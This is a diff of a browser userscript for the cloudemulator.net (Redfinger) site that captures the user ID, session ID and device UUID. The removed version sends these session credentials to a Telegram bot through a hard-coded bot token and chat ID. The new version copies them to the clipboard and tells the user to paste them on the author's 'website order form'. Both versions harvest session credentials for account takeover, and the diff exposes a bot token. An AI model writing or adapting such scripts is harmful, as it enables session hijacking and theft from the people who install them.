@@ -1,20 +1,16 @@
 // ==UserScript==
-// @name         Redfinger Auto Capture + Send
+// @name         Redfinger Auto Capture
 // @namespace    https://dazai-ux.github.io
-// @version      1.4
-// @description  Capture and send credentials directly to Telegram
+// @version      1.5
+// @description  Show credentials for easy copy-paste
 // @author       Redfinger Auto
 // @match        https://www.cloudemulator.net/*
 // @grant        GM_setClipboard
-// @grant        GM_xmlhttpRequest
 // @run-at       document-end
 // ==/UserScript==
 
 (function () {
     'use strict';
-
-    const BOT_TOKEN = "8758270440:AAEdUvBIKpGqhu0CzsLcOV3oQnwRP7c25jI";
-    const CHAT_ID = "6598357465";
 
     function createButton() {
         if (document.getElementById('rf-capture-btn')) return;
@@ -29,11 +25,11 @@
             box-shadow: 0 8px 25px rgba(59,130,246,0.5); cursor: pointer;
         `;
 
-        btn.onclick = sendCredentials;
+        btn.onclick = showCredentials;
         document.body.appendChild(btn);
     }
 
-    function sendCredentials() {
+    function showCredentials() {
         let userId = "Not Found";
         let sessionId = "Not Found";
         let uuid = "Not Found";
@@ -52,43 +48,21 @@
             }
         }
 
-        uuid = localStorage.getItem('uuid') || localStorage.getItem('deviceId') || "Manual";
+        uuid = localStorage.getItem('uuid') || localStorage.getItem('deviceId') || "Please get manually";
 
-        const customer = prompt("Your Name:", "dazai") || "Customer";
-        const days = prompt("How many days?", "2000") || "2000";
-        const vip = prompt("VIP Level?", "SVIP") || "SVIP";
+        const text = `🔑 Redfinger Credentials\n\n` +
+                    `User ID     : ${userId}\n` +
+                    `Session ID  : ${sessionId}\n` +
+                    `UUID        : ${uuid}\n\n` +
+                    `Copy everything above and paste on my website.`;
 
-        const message = `🔑 *New Redfinger Order!*\n\n` +
-                       `👤 Customer: ${customer}\n` +
-                       `📅 Days: ${days}\n` +
-                       `⭐ VIP: ${vip}\n\n` +
-                       `User ID: ${userId}\n` +
-                       `Session ID: ${sessionId}\n` +
-                       `UUID: ${uuid}`;
-
-        // Send to Telegram
-        GM_xmlhttpRequest({
-            method: "POST",
-            url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            headers: { "Content-Type": "application/json" },
-            data: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
-            }),
-            onload: function(response) {
-                if (response.status === 200) {
-                    alert("✅ Credentials sent successfully to your Telegram!");
-                } else {
-                    alert("Sent to clipboard as backup.");
-                    GM_setClipboard(message);
-                }
-            },
-            onerror: function() {
-                alert("Failed to send. Copied to clipboard instead.");
-                GM_setClipboard(message);
-            }
-        });
+        GM_setClipboard(text);
+        
+        alert(`✅ Credentials Captured!\n\n` +
+              `User ID : ${userId}\n` +
+              `Session ID : ${sessionId}\n` +
+              `UUID : ${uuid}\n\n` +
+              `✅ Copied to clipboard!\n\nPaste them on my website order form.`);
     }
 
     setTimeout(createButton, 3000);
